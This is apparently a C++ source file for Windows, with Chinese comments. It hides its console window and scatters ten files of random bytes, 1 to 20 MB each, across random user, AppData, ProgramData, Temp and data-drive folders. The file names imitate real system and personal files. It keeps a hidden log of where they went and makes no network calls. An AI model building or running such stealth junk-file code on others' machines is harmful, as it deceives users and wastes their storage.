// random_file_generator.cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <ctime>
#include <cstdlib>
#include <shlobj.h>
#include <filesystem>
#include <algorithm> // 支持 std::shuffle

// 检查 C++17 支持
#if __cplusplus < 201703L
#error "This program requires C++17 or later"
#endif

namespace fs = std::filesystem;

// 隐藏控制台窗口
void HideConsole() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

// 常见文件扩展名列表
const std::vector<std::string> extensions = {
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
    ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", 
    ".avi", ".mov", ".zip", ".rar", ".exe", ".dll", ".html", 
    ".css", ".js", ".json", ".xml", ".csv", ".log", ".bak",
    ".yaml", ".toml", ".7z", ".md", ".bat", ".vb", ".vbs",
    ".xz", ".tar", ".deb", ".ini", ".htm", ".py", ".cpp",
    ".flac", ".iso", ".tmp", ".img", ".scss", ".msg", ".ps1",
    ".cmd", ".sh", ".conf", ".sys", ".vlt", ".cube", ".apk",
    ".bz", ".gz", ".git", ".env", ".dat", ".rpm", ".dmg", ".sig",
    ".msi", ".vmdk", ".vmx", ".nvram", ".lck", ".ico", ".svg",
    ".ts", ".m3u8", ".c", ".cfg", ".gho", ".go", ".list", ".db",
    ".php", ".woff", ".woff2", ".ttf", ".font"
};

// 常见文件名前缀
const std::vector<std::string> prefixes = {
    "report", "data", "document", "presentation", "image", "photo", 
    "video", "archive", "backup", "config", "settings", "temp", 
    "notes", "meeting", "financial", "project", "plan", "analysis", 
    "summary", "manual", "guide", "tutorial", "sample", "test", 
    "draft", "final", "version", "update", "patch", "release",
    "README", "index", "desktop", "template", "temp", "lib", "system",
    "log", "record", "col", "_index", "main", "style", "node", "golang",
    "vue", "hugo", "three", "dialog", "co", "com", "important", "origin",
    "by", "alias", "utils", "dll", "config", "net", "local", "global",
    "specialize", "i18n", "ssh", "port", "ipconfig", "wlan", "bluetooth",
    "defender", "windows", "subsystem", "vmware", "git", "scoop", "choco",
    "edge", "explorer", "virtual", "outlook", "mail", "google", "chrome",
    "volume", "signal", "time", "robots", "num", "battery", "steam", "game",
    "tencent", "wx", "wegame", "mihomo", "clash", "classin", "tencentmeeting",
    "obs", "service", "browser", "manager", "admin", "user", "bin", "usr", "home",
    "app", "ctf", "lenovo", "rog", "AMD", "intel", "nvidia", "ctf", "boot", "bios",
    "uefi", "bing", "microsoft", "weather", "min", "DAX", "tray", "usb", "web", "wireless",
    "singbox", "v2ray", "ss", "socks", "pc", "localhost", "cfg", "conf", "default",
    "shell", "code", "module"
};

// 常见文件名中间部分
const std::vector<std::string> middles = {
    "_2023", "_2022", "_2021", "_final", "_draft", "_v1", "_v2", 
    "_v3", "_backup", "_temp", "_old", "_new", "_latest", 
    "_project", "_work", "_personal", "_official", "_confidential", 
    "_secret", "_private", "_public", "_archive", "_copy", "_original",
    "_2024", "_2025", "_universal", "_set", "_preset", "-settings", "cf",
    "-network", "bus", "traffic", "_track", "mnt", "mount", "_x86", "_x32",
    "_arm", "_all", "_in", "_secure", "mannual", "def", "_example", "_site",
    "work", "test", "_account", "_server", "_notification", "_runtime", "_exp",
    "_helper", "_list", "_connection", "_network", "_io", "_storage", "_themes",
    "suspend", "-time", "-mention", "service", "server", "name", "failure", "success",
    "_audio", "_camera", "lock", "_administration", "_rule", "_rules", "env", "ignore",
    ".sum", ".min", "common", "_group", "_groups", ".run", ".listen", ".play",
    ".com", ".note", ".sys", ".tts", ".live", ".tmp", ".fo", ".bool", ".bin",
    ".net", ".out", "_output", ".line", ".row", ".col", ".vector", ".str", ".space",
    "_standard", ".const", ".function", "-save", "_message", "_link", "-compress"
};

// 获取随机数生成器
std::mt19937& get_random_engine() {
    static std::mt19937 engine(std::random_device{}());
    return engine;
}

// 生成随机文件名
std::string generate_filename() {
    auto& engine = get_random_engine();
    std::uniform_int_distribution<size_t> prefix_dist(0, prefixes.size() - 1);
    std::uniform_int_distribution<size_t> middle_dist(0, middles.size() - 1);
    std::uniform_int_distribution<size_t> ext_dist(0, extensions.size() - 1);
    std::uniform_int_distribution<int> num_dist(1, 1000);
    
    return prefixes[prefix_dist(engine)] + 
           middles[middle_dist(engine)] + 
           "_" + std::to_string(num_dist(engine)) + 
           extensions[ext_dist(engine)];
}

// 生成随机文件大小 (1-20 MB)
size_t generate_file_size() {
    auto& engine = get_random_engine();
    std::uniform_int_distribution<size_t> size_dist(1 * 1024 * 1024, 20 * 1024 * 1024);
    return size_dist(engine);
}

// 获取Windows系统上的随机目录
fs::path get_random_directory() {
    auto& engine = get_random_engine();
    
    // Windows常见目录列表
    std::vector<fs::path> common_dirs = {
        fs::path("C:\\OnedriveTemp"),
        fs::path("C:\\ProgramData"),
        fs::path("C:\\Users"),
        fs::path("C:\\Users"),
        fs::path("C:\\Users"),
        fs::path("C:\\Temp"),
        fs::path("D:\\"),
        fs::path("E:\\"),
        fs::path("F:\\"),
        fs::path("D:\\"),
        fs::path("E:\\"),
        fs::path("F:\\"),
        fs::path(getenv("USERPROFILE")),
        fs::path(getenv("APPDATA")),
        fs::path(getenv("LOCALAPPDATA")),
        fs::path(getenv("TEMP"))
    };
    
    std::shuffle(common_dirs.begin(), common_dirs.end(), engine);
    
    for (const auto& dir : common_dirs) {
        if (fs::exists(dir) && fs::is_directory(dir)) {
            // 随机选择一个子目录
            std::vector<fs::path> subdirs;
            try {
                for (const auto& entry : fs::directory_iterator(dir)) {
                    if (entry.is_directory()) {
                        subdirs.push_back(entry.path());
                    }
                }
                
                if (!subdirs.empty()) {
                    std::uniform_int_distribution<size_t> dist(0, subdirs.size() - 1);
                    return subdirs[dist(engine)];
                }
            } catch (...) {
                // 忽略权限错误等
                continue;
            }
        }
    }
    
    // 回退到临时目录
    return fs::temp_directory_path();
}

int main() {
    // 隐藏控制台窗口
    HideConsole();
    
    // 记录文件位置
    fs::path record_file = "C:\\ProgramData\\junk_files_record.txt";
    std::ofstream record(record_file, std::ios::app);
    if (!record) {
        record_file = fs::temp_directory_path() / "junk_files_record.txt";
        record.open(record_file, std::ios::app);
    }
    
    const int total_files = 10; // 生成文件总数
    int files_created = 0;
    
    while (files_created < total_files) {
        try {
            fs::path dir = get_random_directory();
            std::string filename = generate_filename();
            fs::path filepath = dir / filename;
            size_t file_size = generate_file_size();
            
            std::ofstream file(filepath, std::ios::binary);
            if (file) {
                std::vector<char> buffer(1024 * 1024); // 1MB 缓冲区
                auto& engine = get_random_engine();
                std::uniform_int_distribution<int> byte_dist(0, 255);
                
                size_t remaining = file_size;
                while (remaining > 0) {
                    size_t chunk_size = std::min(buffer.size(), remaining);
                    for (size_t i = 0; i < chunk_size; ++i) {
                        buffer[i] = static_cast<char>(byte_dist(engine));
                    }
                    file.write(buffer.data(), chunk_size);
                    remaining -= chunk_size;
                }
                
                record << filepath.string() << "\n";
                files_created++;
            }
        } catch (...) {
            // 忽略权限错误等，继续尝试
        }
    }
    
    record.close();
    return 0;
}
